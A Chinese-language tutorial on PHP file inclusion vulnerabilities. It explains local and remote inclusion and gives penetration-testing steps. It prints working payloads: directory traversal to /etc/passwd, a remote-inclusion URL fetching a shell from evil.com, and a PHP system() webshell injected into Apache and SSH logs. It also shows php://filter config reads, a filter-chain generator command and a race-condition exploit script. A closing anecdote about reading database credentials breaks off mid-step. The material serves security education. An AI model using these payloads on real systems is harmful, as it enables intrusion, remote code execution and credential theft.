# 文件包含漏洞

## 概述

许多编程语言，包括 PHP、Java、ASP 和 JSP，都支持动态包含文件的功能（将复用代码保存在文件中，使用时插入文件内的代码执行）。此功能对于标准化和重用代码很有用。根据这些包含的实现方式，它们可能被利用来执行任意代码。然而，值得注意的是，由于现代 Web 应用程序中模板的广泛采用，此类函数的使用已变得不那么常见。

目录遍历和文件包含之间的主要区别在于，文件包含漏洞侧重于利用包含任意文件，这可能导致远程代码执行（RCE）或信息泄露，而目录遍历侧重于访问系统中的任意文件，导致信息泄露。然而，根据应用程序的上下文，目录遍历也可能导致 RCE，例如，在上一节的示例中，目录遍历被用于读取私有 SSH 密钥以获得访问权限。

文件包含漏洞与目录遍历漏洞的不同之处主要在于其可利用性和潜在影响。文件包含问题涉及动态包含文件的利用，这可能导致 RCE 或敏感信息泄露。另一方面，目录遍历漏洞侧重于获取对系统中任意文件的未授权访问，通常导致信息泄露。

然而，根据应用程序的上下文，目录遍历也可能导致 RCE。例如，在上一节讨论的场景中，目录遍历被利用来读取私有 SSH 密钥并获得未授权访问。

## 远程文件包含

PHP语言特别容易出现文件包含漏洞，因为它的包含函数接受远程文件路径。

攻击者指定一个外部 URL 作为包含文件的位置。PHP 包含函数接受这个位置作为输入，接着，执行环境将获取指定的文件并执行其内容。因此，攻击者能够构建一个包含任意复杂内容的恶意脚本，将其寄存在他控制的 Web 服务器上，并通过易受攻击的应用程序函数调用它然后执行。

## 本地文件包含

当脚本限定于调用这个函数的相同应用程序时，攻击者仍然可以利用应用程序的行为执行未授权操作。

- 在服务器上可能有一些通过正常途径无法访问的文件，例如，任何访问路径`/admin`的请求都会被应用程序实施的访问控制阻止。如果能够将敏感功能包含在一个授权访问的页面中，那么就可以访问那个功能。

- 服务器上的一些静态资源也受到同样的保护，无法直接访问。如果能够将这些文件动态包含在其他应用程序页面中，那么执行环境就会将静态资源的内容复制到它的响应中。

## PHP 概念示意

PHP 尤其是一种主要发现文件包含漏洞的语言，因为它具有广泛的功能和广泛的使用。某些常用的 PHP 函数可能被滥用来利用这些漏洞。

**示例：**
- `include()`
- `include_once()`
- `require()`
- `require_once()`

除此之外，其他函数如 `fopen()` 和 `file_get_contents()` 也不应被忽视，它们在某些情况下也可能受到文件包含漏洞的影响。

为了更好地理解，让我们考虑以下易受 LFI 漏洞攻击的 PHP 脚本：

**代码**
```php
<?php
$location = $_GET['location'];
include("weather_data/" . $location);
?>
```

该 PHP 脚本根据用户提供的输入参数 `location` 使用 `include()` 函数动态包含文件。然后，脚本使用与用户位置对应的文件来显示相关的天气数据。例如，网站可能使用类似 `http://vulnerabledomain.com/index.php?location=Islamabad.php` 的 URL 来显示特定于“Islamabad”的天气数据。

然而，由于 `location` 参数在通过 `include()` 函数动态加载之前未经清理，这种方法也引入了文件包含漏洞。因此，我们可以通过 `location` 参数提交任何有效的本地路径，以包含预期目录之外的文件。例如，攻击者可以请求 UNIX 的 `/etc/passwd` 文件，如下所示：

**POC**
```
http://vulnerabledomain.com/index.php?location=../../../etc/passwd
```

如果攻击者设法控制了绝对路径，则上述函数可能被利用于远程文件包含（RFI）攻击。在 RFI 攻击中，应用程序将包含并执行远程文件，可能导致 RCE。以下是可利用 URL 的样子：

**POC**
```
http://vulnerabledomain.com/index.php?location=http://evil.com/shell.txt
```

在此场景中，`shell.txt` 文件包含将被包含到网页中并由服务器执行的 PHP 代码。要使代码成功执行，关键的是 `shell.txt` 文件必须托管在远程位置，并作为纯文本文件提供。

值得注意的是，RFI 在近些年已变得不那么普遍。现代 PHP 安装通常默认禁用 `allow_url_include` 和 `allow_url_fopen` 设置，从而防止包含远程文件。

## 查找文件包含漏洞

任何用户提交的数据项都可能引起文件包含漏洞。它们经常出现在指定一种语言或一个位置的请求参数中，也常常发生在以参数形式传送服务器端文件名的情况下。

渗透测试步骤
- 要测试远程文件包含漏洞，执行以下步骤。

    1. 向每一个目标参数提交一个连接受控制的Web服务器资源的URL，并确定是否收到运行目标应用程序的服务器提出的任何请求。

    2. 如果第一次测试失败，尝试提交一个包含不存在的IP地址的URL，并确定服务器试图与这个地址建立连接时是否出现超时。

    3. 如果发现应用程序易于受到远程文件包含攻击，与前面描述的动态执行攻击中一样，使用相关语言中可用的API，构建一段恶意脚本实施攻击。

- 相对于远程文件包含而言，存在本地文件包含漏洞的脚本环境要更多一些。要测试本地文件包含漏洞，执行以下步骤。

    1. 提交服务器上一个已知可执行资源的名称，确定应用程序的行为是否有任何变化。

    2. 提交服务器上一个已知静态资源的名称，确定它的内容是否被复制到应用程序的响应中。

    3. 如果应用程序易于受到本地文件包含攻击，尝试通过Web服务器访问任何无法直接到达的敏感功能或资源。

    4. 测试能否利用之前讲到的遍历技巧访问其他目录中的文件。


## 本地文件包含到远程代码执行

如前所述，LFI 可以升级为 RCE，有多种技术可以实现此目的。在本节中，我们将深入探讨在当今 Web 应用程序中仍然相关且适用的技术。

### 通过 Apache 日志文件从 LFI 到 RCE

使用 LFI 实现 RCE 的目标是尝试加载本地文件，如日志文件。其中一种技术称为日志文件注入。日志文件包含对服务器发出的所有请求的记录，包括客户端 IP 地址、请求的 URL、用户代理等。通过将恶意 PHP 代码注入到请求中被记录的部分（例如通过操纵 HTTP 请求中的用户代理数据），可以污染这些日志文件。

之后，通过使用 LFI，可以强制服务器加载包含恶意 PHP 代码的日志文件并执行它。让我们考虑一个托管在 Apache Web 服务器上的易受 LFI 攻击的应用程序的示例，其中日志文件通常位于 `/var/log/apache2/access.log`。用于加载日志文件的目录遍历 POC URL 如下：

**POC**
```
http://demo-site.local:8080/lfi.php?file=/var/log/apache2/access.log
```

接下来，为了污染用户代理，我们将构造一个包含恶意 PHP 代码的请求，该代码通过 `cmd` 参数执行系统命令：

**命令**
```bash
curl -I http://demo-site.local:8080/ -A "<?php system($_GET['cmd']);?>"
```

`-A` 标志用于设置用户代理字符串，注入我们的 PHP 代码。由于日志文件已被污染，一旦通过 LFI 加载，代码将被解释为 PHP。触发执行的示例 URL 可能如下：

**POC**
```
http://demo-site.local:8080/lfi.php?file=/var/log/apache2/access.log&cmd=id
```

在此情况下，`id` 命令将在服务器上执行，成功 RCE。

日志文件可能位于不同的目录，具体取决于 Web 服务器的类型及其配置。有关在模糊测试期间可以定位的更多潜在日志文件位置，请参考此[详尽列表](https://raw.githubusercontent.com/nixawk/fuzzdb/master/attack/lfi/LFI-linux-httpd-log.txt)

### 通过 SSH 认证日志从 LFI 到 RCE

在日志文件不可访问或不在可预测位置的情况下，值得尝试访问 SSH 认证日志。这些日志包含用户名、密码以及帐户认证失败或成功等详细信息。

与访问日志类似，SSH 日志也可以被我们的 PHP 代码污染。这可以通过首先向目标机器进行 SSH 登录尝试，然后使用恶意有效载荷作为用户名来实现，例如 `<?php system($_GET["cmd"]); ?>`。从而通过登录将 PHP 代码注入 SSH 日志

一旦 SSH 认证日志被污染，它们可以通过 LFI 加载，从而导致 RCE。以下 URL 一旦执行，将返回目标 Web 服务器上 `id` 命令的结果：

**POC**
```
http://demo-site.local:8080/lfi.php?file=/var/log/auth.log&cmd=id
```

### 使用 PHP 包装器和协议从 LFI 到 RCE

在访问常见途径（如日志文件）受到限制的情况下，你可以利用 PHP 过滤器。PHP 过滤器是 PHP 的一个内置功能，使开发人员能够验证和清理输入。然而，它们可能是一把双刃剑，因为它们也可以被武器化以利用 LFI 漏洞。

其中一个常用的文件系统过滤器是 `php://filter`，它允许开发人员将文件内容转换为 base64 编码。例如，以下命令可用于读取位于 `/var/www/mutillidae/config.inc` 的配置文件。

**POC**
```
http://demo-site.local:8080/lfi.php?file=php://filter/convert.base64-encode/resource=/var/www/mutillidae/config.inc
```

在某些条件下，如果攻击者完全控制了传递给 PHP 的 `Require` 或 `include` 函数的用户输入，PHP 过滤器可能导致 RCE。可能发生的一种情况是，如果 PHP 设置 `allow_url_include` 已启用（在现代 PHP 版本中通常禁用）。

为了自动化此过程，可以使用像 [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) 这样的工具。该工具旨在自动化创建过滤器链，可以将无害字符串转换为恶意有效载荷。本质上，这是通过欺骗 PHP 解释器将恶意有效载荷当作常规字符串处理并执行来实现的。

例如，以下命令可用于生成一个 PHP 过滤器链，该链将返回 `id` 命令的结果：

**命令**
```bash
python3 php_filter_chain.py --chain '<?php system("id"); ?>'
```

### 通过竞争条件从 LFI 到 RCE

在 Brett Moore 于 2011 年发表的一篇题为“[LFI with PHPInfo() Assistance 的研究论文](https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf)”，揭示了一种使用竞争条件利用 LFI 的新方法。为了有效利用此技术实现 RCE，需要满足以下前提条件：

1. 应用程序必须存在 LFI 漏洞。  
2. PHPInfo 文件必须可访问。  
3. `php.ini` 文件中的 `file_uploads` 配置必须启用。

要理解此漏洞，必须了解 PHP 引擎如何处理文件上传以及 PHPInfo() 函数的作用。当在 PHP 中上传文件时，它最初存储在临时目录中，并在短时间内被删除。该目录的位置是随机的，因此无法预测。然而，`PHPInfo()` 函数可用于揭示随机文件名，因为它包含所有 PHP 变量的值。

在 LFI 漏洞的上下文中，此行为可以被滥用以实现 RCE。以下是可能发生的逐步过程：

1. 攻击者上传一个恶意 PHP 文件，其中包含一个执行命令的函数，例如 `<?php system($_GET['cmd']); ?>`。  
2. 同时，攻击者迅速向 `PHPInfo()` 页面发起请求，试图在文件仍存在于临时目录时捕获其输出。

**请求**
```http
POST /phpinfo.php HTTP/1.1
Host: demo-site.local:8080
Content-Type: multipart/form-data; boundary=-----------------------------7db268605ae
Content-Length: 187

-----------------------------7db268605ae
Content-Disposition: form-data; name="dummyname"; filename="tmgm.txt"
Content-Type: text/plain

Test
-----------------------------7db268605ae
```

3. 根据 `PHPInfo()` 文件的输出，攻击者确定包含我们 PHP 代码的上传文件的临时路径和文件名。

4. 使用 LFI 漏洞，攻击者在临时文件从服务器上被删除之前包含它。

**注意**：此方法依赖于利用竞争条件漏洞，因此攻击者应快速通过 LFI 包含临时文件，以免 PHP 的垃圾回收将其从临时目录中删除。

幸运的是，研究人员已经编写了脚本来简化利用过程。以下脚本试图利用该条件 [https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py]。

执行脚本所需的命令如下：

**命令**
```bash
Python2 exp.py demo-site.local 8080 100
```

该脚本接受三个参数：
- `demo-site.local`——易受攻击网站的域名，
- `8080`——网站运行的端口，
- `100`——脚本尝试利用竞争条件的次数。

一旦脚本执行，它会创建一个 shell，可以使用 LFI 漏洞调用。以下是加载 shell 的示例：

**有效载荷：**
```
demo-site.local:8080/lfi.php?file=/tmp/g&1=system('id');
```

## 本地文件泄露

本地文件泄露（LFD）可以被视为 LFI 漏洞的一个子集。LFD 漏洞可能导致本地文件暴露，有时可能导致访问敏感文件，如配置文件、SSH 私钥等，可能导致信息泄露甚至 RCE。

该漏洞主要出现在 PHP 中，因为 `readfile()` 函数被广泛使用。类似地，如果 `file_get_contents()` 函数未经适当清理，也可能成为此漏洞的向量。其他编程语言也有类似的函数，可以被利用以达到相同的效果。

为了理解这一点，让我们考虑以下 PHP 代码：

**易受攻击的代码**
```php
<?php
$file = $_GET['file'];
$read = readfile($file);
?>
```

在此代码中，通过 `file` 参数获取的用户输入直接传递给 `readfile` 函数。该函数负责读取文件并将其内容保存到输出缓冲区。由于没有验证，可以操纵输入以遍历目录并访问本地文件。

在一个真实的渗透测试场景中，我们遇到了类似的情况：
- 通过将 `file` 参数传递为 `index.php` 来下载该文件。

    ```
    www.vulnerabledomain.com/download.php?file=index.php
    ```

- 检查源代码后，发现使用了 `require_once` 函数来包含一个名为 `connections/configuration.php` 的文件，该文件可能包含配置数据，包括数据库凭据。自然而然地，下一步是读取其内容：

    ```
    www.target.com/download.php?file=connections/configuration.php
    ```

- 输出显示了一个包含数据库凭据和主机名的 MySQL 数据库配置文件。我们的下一步是找到`phpMyAdmin`界面，这是一个基于 Web 的 MySQL 数据库管理工具。另一种方法是查看服务器是否允许通过特定端口远程连接到数据库服务器，并直接连接。

- 找到 phpMyAdmin 界面后，尝试连接到数据库
